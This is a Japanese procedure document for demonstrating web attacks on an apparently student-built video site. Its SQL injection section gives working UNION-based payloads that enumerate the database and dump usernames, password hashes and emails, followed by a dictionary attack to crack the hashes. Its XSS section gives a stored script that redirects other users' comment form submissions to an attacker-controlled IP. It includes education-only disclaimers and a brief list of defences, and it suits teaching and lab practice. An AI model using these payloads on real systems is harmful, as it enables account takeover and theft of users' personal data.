# Webサーバー攻撃デモ手順書

## 概要
本手順書は、SQLインジェクションとXSS攻撃のデモンストレーション用です。
**注意: この手順書は教育目的のみに使用し、実際のシステムへの不正アクセスには使用しないでください。**

## 1. SQLインジェクション攻撃デモ

### 1.1 エラーからSQL構造を推測
1 = '1'などを入力すると以下のエラーメッセージが表示される。
```
予期せぬエラーが発生しました: 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1'%' ORDER BY upload_at DESC' at line 1
```
・このエラーメッセージからわかること
<br>MySQLのエラー表示の特徴→ 構文エラーが起きた付近のSQLトークンをそのまま出力する

%直後にユーザーが入力していない ORDER BY upload_at DESC が現れる→ Webアプリ側がSQL末尾に自動的に ORDER BY を付与していると推測

% はワイルドカードで、通常は LIKE句で使われる→ SQLの末尾が LIKE ‘%入力%’ ORDER BY upload_at DESC であると判断

### 1.2 列数を試行で特定
' AND 1=2 UNION SELECT 1 --'と入力すると以下のエラーメッセージが表示される。
```
予期せぬエラーが発生しました: 1222 (21000): The used SELECT statements have a different number of columns
```
このエラーが出なくなるまで列数を１つずつ増やす
　→今回の場合７列であるため以下でエラーが出なくなる
```sql
' AND 1=2 UNION SELECT 1, 2, 3, 4, 5, 6, 7 --'
 ```

### 1.3 データベース名の取得
動画検索フィールドまたはコメント投稿欄に以下のペイロードを入力：

```sql
' AND 1=2 UNION SELECT 1, 2, DATABASE(), 4, 5, 6, 7 -- '
```

**期待される結果**: データベース名（KouTube）が表示される

### 1.4 テーブル名の取得
次に以下のペイロードを使用してテーブル名を取得：

```sql
' AND 1=2 UNION SELECT 1, 2, GROUP_CONCAT(table_name), 4, 5, 6, 7 FROM information_schema.tables WHERE table_schema = 'KouTube' -- '
```

**期待される結果**: データベース内のテーブル名一覧が表示される

### 1.5 usersテーブルのカラム構造取得
usersテーブルのカラム名を取得：

```sql
' AND 1=2 UNION SELECT 1, 2, GROUP_CONCAT(column_name), 4, 5, 6, 7 FROM information_schema.columns WHERE table_schema = 'KouTube' AND table_name = 'users' -- '
```

**期待される結果**: usersテーブルのカラム名（id, username, password, email等）が表示される

### 1.6 機密情報の取得
ユーザー情報（ユーザー名、パスワード、メールアドレス）を取得：

```sql
' AND 1=2 UNION SELECT 1, 2, CONCAT_WS('\n', username, password, email), 4, 5, 6, 7 FROM users -- '
```

**期待される結果**: 全ユーザーの機密情報が表示される

### 1.7 辞書攻撃によるパスワード解読
1.4で取得したハッシュ化されたパスワードに対して辞書攻撃を実行：

1. **攻撃準備**:
   - 辞書ファイル（a.txt）を用意
   - attacks_jisyo.pyスクリプトを使用

2. **攻撃実行**:
   ```bash
   python3 attacks_jisyo.py
   ```

3. **スクリプトの動作**:
   - 取得したsalt値（例：`$6$O/zgIwlwUdB90Lqq`）を使用
   - 辞書ファイルから候補パスワードを順次試行
   - ハッシュ値が一致したパスワードを特定

**期待される結果**: 平文パスワードが解読され、実際のユーザーアカウントへの不正アクセスが可能になる

## 2. XSS攻撃デモ

### 2.1 攻撃の準備
1. 攻撃者用のWebページ（you.html）を用意
2. 攻撃者のIPアドレスを確認（例：192.168.25.128）

### 2.2 XSSペイロードの投稿
動画のコメント欄に以下のJavaScriptコードを投稿：

```javascript
<script> window.onload = function(){ document.querySelector(".comment-form form").onsubmit = function(){this.action = "http://192.168.25.128/project/projitu_1/static/you.html"; };};</script>
```

### 2.3 攻撃の実行
1. 第三者ユーザーが該当の動画ページにアクセス
2. 第三者ユーザーがコメントを投稿しようとする
3. キーを押すと、フォームのaction属性が攻撃者のサイトに変更される
4. コメント投稿時に攻撃者のサイト（you.html）にリダイレクトされる

## 3. デモ実行時の注意事項

### セキュリティ対策の確認
- 入力値のサニタイゼーション
- SQLクエリのプリペアードステートメント使用
- CSRFトークンの実装
- Content Security Policy (CSP)の設定

### デモ環境の要件
- ローカル環境またはテスト専用環境での実行
- 攻撃対象システムの所有者の許可
- ネットワーク分離された環境での実施

---
**免責事項**: この手順書は教育目的のみに作成されています。実際のシステムに対する不正アクセスや攻撃行為は法的に禁止されており、発見された場合は法的措置の対象となる可能性があります。